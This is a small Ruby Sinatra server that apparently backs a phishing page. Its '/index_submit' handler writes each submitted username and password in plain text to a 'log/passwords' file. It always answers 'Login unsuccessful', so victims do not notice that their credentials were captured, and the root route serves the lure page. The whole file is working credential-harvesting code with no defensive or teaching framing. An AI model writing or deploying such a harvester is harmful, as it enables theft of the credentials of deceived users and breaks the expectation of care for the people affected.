require 'rubygems'
require 'sinatra'
require 'sinatra/flash'
require 'sinatra/redirect_with_flash'

class Server < Sinatra::Base
  enable :sessions
  register Sinatra::Flash
  helpers Sinatra::RedirectWithFlash

  post '/index_submit' do
    open('log/passwords', 'a') do |f|
      f.puts "#{params[:login]} #{params[:password]}"
    end
    redirect '/', error: 'Login unsuccessful'
  end

  get '/' do
    erb File.read('public/index.html.erb')
  end

end
